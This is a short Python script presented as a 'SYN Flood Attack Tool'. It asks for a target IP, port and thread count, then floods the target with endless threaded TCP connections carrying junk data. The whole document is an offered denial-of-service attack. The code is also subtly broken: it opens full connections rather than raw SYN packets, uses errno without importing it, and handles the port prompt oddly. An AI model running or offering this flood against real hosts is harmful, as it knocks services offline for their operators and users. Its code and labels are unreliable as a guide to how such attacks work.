
import sys
import socket
import time
from threading import Thread

def main():
    print("Welcome to the SYN Flood Attack Tool!")
    
    target_ip = input("Enter the IP address of your target: ")
    port = int(input("Enter the port number (default 80): ")) if len(sys.argv) > 2 else 80

    while True:
        try:
            attack_threads = []
            for i in range(int(input("How many threads would you like to use? "))):
                t = Thread(target=send_syn, args=(target_ip, port))
                t.start()
                attack_threads.append(t)
            
            for thread in attack_threads:
                thread.join()
        except KeyboardInterrupt:
            print("Exiting...")
            sys.exit()
        
def send_syn(target_ip, port):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, port))
            print("Connected to %s:%d" % (target_ip, port))
            
            while True:
                data = b'A' * 1024
                sock.send(data)
        except OSError as e:
            if e.errno != errno.ECONNRESET:
                raise
            continue
        
if __name__ == '__main__':
    main()
